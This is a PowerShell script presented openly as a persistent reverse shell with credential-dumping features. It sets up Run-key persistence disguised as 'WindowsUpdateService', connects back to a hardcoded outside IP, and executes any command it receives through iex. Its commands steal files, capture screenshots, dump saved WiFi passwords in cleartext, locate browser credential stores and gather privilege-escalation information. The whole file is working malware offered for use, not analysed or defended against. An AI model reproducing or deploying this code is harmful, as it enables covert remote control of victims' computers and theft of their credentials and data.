# reverse_shell.ps1 - Persistent reverse shell with credential dumping capabilities
$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
$serverPort = 47034
$reconnectDelay = 15  # Seconds to wait before reconnecting
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

# Ensure persistence by copying to startup location
if ($MyInvocation.MyCommand.Path -ne $localPayloadPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $localPayloadPath -Force
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdateService"
    $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force
}

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
    return "SYSINFO:$hostname|$username|$os|$domain"
}

function Handle-SpecialCommand {
    param($command, $writer)
    
    switch -regex ($command) {
        "^download .+" {
            $filePath = $command -replace "^download ", ""
            if (Test-Path $filePath) {
                try {
                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                    $base64Data = [System.Convert]::ToBase64String($fileBytes)
                    $writer.WriteLine("FILE_DATA:$base64Data")
                } catch {
                    $writer.WriteLine("ERROR:Failed to read file: $($_.Exception.Message)")
                }
            } else {
                $writer.WriteLine("ERROR:File not found: $filePath")
            }
            return $true
        }
        "^upload .+" {
            $parts = $command -split " ", 3
            if ($parts.Length -ge 3) {
                $remotePath = $parts[1]
                $base64Data = $parts[2]
                try {
                    $fileData = [System.Convert]::FromBase64String($base64Data)
                    [System.IO.File]::WriteAllBytes($remotePath, $fileData)
                    $writer.WriteLine("SUCCESS:File uploaded to $remotePath")
                } catch {
                    $writer.WriteLine("ERROR:Upload failed: $($_.Exception.Message)")
                }
            } else {
                $writer.WriteLine("ERROR:Invalid upload command format")
            }
            return $true
        }
        "^screenshot$" {
            try {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                
                $memoryStream = New-Object System.IO.MemoryStream
                $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                $base64Data = [System.Convert]::ToBase64String($memoryStream.ToArray())
                
                $graphics.Dispose()
                $bitmap.Dispose()
                $memoryStream.Dispose()
                
                $writer.WriteLine("SCREENSHOT:$base64Data")
            } catch {
                $writer.WriteLine("ERROR:Screenshot failed: $($_.Exception.Message)")
            }
            return $true
        }
        "^wifi$" {
            try {
                # Extract WiFi passwords using netsh
                $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
                    $_.ToString().Split(":")[1].Trim()
                }
                
                $results = @()
                foreach ($profile in $wifiProfiles) {
                    $profileInfo = netsh wlan show profile name="$profile" key=clear
                    $password = ($profileInfo | Select-String "Key Content") -replace "Key Content\s*:\s*", ""
                    
                    if ($password) {
                        $results += "Profile: $profile | Password: $password"
                    }
                }
                
                if ($results) {
                    $writer.WriteLine("WIFI_PASSWORDS:" + ($results -join "`n"))
                } else {
                    $writer.WriteLine("INFO:No WiFi passwords found or access denied")
                }
            } catch {
                $writer.WriteLine("ERROR:WiFi dump failed: $($_.Exception.Message)")
            }
            return $true
        }
        "^browsers$" {
            try {
                $browserData = @()
                
                # Chrome credentials
                $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
                if (Test-Path $chromePath) {
                    $browserData += "CHROME:Login Data found at $chromePath"
                    # In a real scenario, we would extract and decrypt the credentials
                }
                
                # Firefox credentials (if available)
                $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
                if (Test-Path $firefoxPath) {
                    $profiles = Get-ChildItem $firefoxPath -Directory | Where-Object { $_.Name -match "default" }
                    foreach ($profile in $profiles) {
                        $signonsPath = Join-Path $profile.FullName "signons.sqlite"
                        $keyPath = Join-Path $profile.FullName "key4.db"
                        
                        if (Test-Path $signonsPath) {
                            $browserData += "FIREFOXY:Signons database found at $signonsPath"
                        }
                        if (Test-Path $keyPath) {
                            $browserData += "FIREFOX:Key database found at $keyPath"
                        }
                    }
                }
                
                if ($browserData) {
                    $writer.WriteLine("BROWSER_DATA:" + ($browserData -join "`n"))
                } else {
                    $writer.WriteLine("INFO:No browser credential files found")
                }
            } catch {
                $writer.WriteLine("ERROR:Browser dump failed: $($_.Exception.Message)")
            }
            return $true
        }
        "^creds$" {
            try {
                # Comprehensive credential dump
                $credResults = @()
                
                # SAM database extraction attempt
                $credResults += "Attempting credential extraction..."
                
                # WiFi passwords
                $wifiResults = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
                    $profile = $_.ToString().Split(":")[1].Trim()
                    $profileInfo = netsh wlan show profile name="$profile" key=clear
                    $password = ($profileInfo | Select-String "Key Content") -replace "Key Content\s*:\s*", ""
                    if ($password) {
                        "WiFi: $profile | $password"
                    }
                }
                
                if ($wifiResults) {
                    $credResults += $wifiResults
                }
                
                # Browser credentials location info
                $credResults += "Browser credentials stored in standard locations"
                
                $writer.WriteLine("CREDS:" + ($credResults -join "`n"))
            } catch {
                $writer.WriteLine("ERROR:Credential dump failed: $($_.Exception.Message)")
            }
            return $true
        }
        "^privesc$" {
            try {
                # Basic privilege escalation checks
                $privescResults = @()
                
                # Check current privileges
                $whoami = whoami /priv
                $privescResults += "Current privileges:"
                $privescResults += $whoami
                
                # Check installed applications
                $programs = Get-WmiObject -Class Win32_Product | Select-Object Name, Version
                $privescResults += "Installed applications:"
                $privescResults += $programs | Format-Table -AutoSize | Out-String
                
                # Check services
                $services = Get-Service | Where-Object {$_.Status -eq "Running"}
                $privescResults += "Running services:"
                $privescResults += $services | Format-Table -AutoSize | Out-String
                
                $writer.WriteLine("PRIVESC:" + ($privescResults -join "`n"))
            } catch {
                $writer.WriteLine("ERROR:PrivEsc check failed: $($_.Exception.Message)")
            }
            return $true
        }
        default {
            return $false
        }
    }
}

# Main persistent loop (NEVER EXITS)
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info
        $writer.WriteLine((Get-SystemInfo))
        
        # Command execution loop (NEVER EXITS ON ERROR)
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }  # Server closed connection
                
                if ($command -eq "exit") { break }
                
                # Check if it's a special command
                $isSpecial = Handle-SpecialCommand $command $writer
                
                if (-not $isSpecial) {
                    # Execute regular command
                    $result = iex $command 2>&1 | Out-String
                    $writer.Write($result)
                }
            }
            catch {
                # Send error but KEEP CONNECTION ALIVE
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.Write($errorOutput)
            }
        }
    }
    catch {
        # Connection failed, but we'll retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
